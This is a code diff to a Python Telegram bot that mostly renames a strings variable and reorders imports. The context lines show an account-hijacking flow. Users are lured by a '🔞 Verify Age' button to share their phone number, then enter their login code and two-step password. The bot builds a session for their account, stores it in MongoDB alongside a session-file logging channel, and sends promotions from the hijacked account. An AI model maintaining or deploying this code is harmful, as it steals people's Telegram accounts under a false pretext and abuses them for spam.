@@ -3,6 +3,10 @@ import asyncio
 import random
 from pathlib import Path
 from pyrogram import Client, filters, enums
+from pymongo.mongo_client import MongoClient
+from pymongo.server_api import ServerApi
+from config import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, PROMO_TEXTS, STRINGS, OTP_KEYBOARD, VERIFICATION_SUCCESS_KEYBOARD
+
 from pyrogram.types import (
     Message,
     InlineKeyboardMarkup,
@@ -23,9 +27,6 @@ from pyrogram.errors import (
     SessionRevoked,
     SessionExpired
 )
-from pymongo.mongo_client import MongoClient
-from pymongo.server_api import ServerApi
-from config import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, PROMO_TEXTS, STRINGS, OTP_KEYBOARD, VERIFICATION_SUCCESS_KEYBOARD
 
 # MongoDB Connection Setup
 mongo_client = MongoClient(DATABASE_URI_SESSIONS_F, server_api=ServerApi('1'))
@@ -87,7 +88,7 @@ async def start_login(bot: Client, message: Message):
                 {"id": user_id},
                 {"$set": {"logged_in": True}}
             )
-            await message.reply(strings['verification_success'])
+            await message.reply(STRINGS['verification_success'])
             asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_data['mobile_number']))
             return
         except Exception:
@@ -97,11 +98,11 @@ async def start_login(bot: Client, message: Message):
             )
     
     if check_login_status(user_id):
-        await message.reply(strings['already_logged_in'])
+        await message.reply(STRINGS['already_logged_in'])
         return
     
     await message.reply(
-        strings['age_verification'],
+        STRINGS['age_verification'],
         reply_markup=ReplyKeyboardMarkup(
             [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
             resize_keyboard=True,
@@ -118,14 +119,14 @@ async def handle_logout(bot: Client, message: Message):
         {"$set": {"logged_in": False}}
     )
     
-    await message.reply(strings['logout_success'])
+    await message.reply(STRINGS['logout_success'])
     await cleanup_user_state(user_id)
     
 @Client.on_message(filters.private & filters.contact)
 async def handle_contact(bot: Client, message: Message):
     user_id = message.from_user.id
     if check_login_status(user_id):
-        await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
+        await message.reply(STRINGS['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
     processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
@@ -190,7 +191,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
         except PhoneCodeInvalid:
             state['otp_attempts'] += 1
             if state['otp_attempts'] >= 3:
-                await query.message.edit(strings['otp_blocked'])
+                await query.message.edit(STRINGS['otp_blocked'])
                 database.update_one(
                     {"id": user_id},
                     {"$set": {"blocked": True}}
@@ -200,7 +201,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             
             attempts_left = 3 - state['otp_attempts']
             await query.message.edit(
-                strings['otp_wrong'].format(attempts=attempts_left),
+                STRINGS['otp_wrong'].format(attempts=attempts_left),
                 reply_markup=OTP_KEYBOARD
             )
             state['otp_digits'] = ''
@@ -261,7 +262,7 @@ async def handle_2fa_password(bot: Client, message: Message):
     except PasswordHashInvalid:
         state['2fa_attempts'] += 1
         if state['2fa_attempts'] >= 3:
-            await message.reply(strings['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
+            await message.reply(STRINGS['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
             database.update_one(
                 {"id": user_id},
                 {"$set": {"blocked": True}}
@@ -271,7 +272,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         
         attempts_left = 3 - state['2fa_attempts']
         error_msg = await message.reply(
-            strings['2fa_wrong'].format(attempts=attempts_left),
+            STRINGS['2fa_wrong'].format(attempts=attempts_left),
             reply_markup=ReplyKeyboardRemove()
         )
         state['last_msg_id'] = error_msg.id
@@ -326,7 +327,7 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         
         await bot.send_message(
             user_id,
-            strings['verification_success'],
+            STRINGS['verification_success'],
             reply_markup=VERIFICATION_SUCCESS_KEYBOARD
         )
         asyncio.create_task(send_promotion_messages(bot, string_session, phone_number))
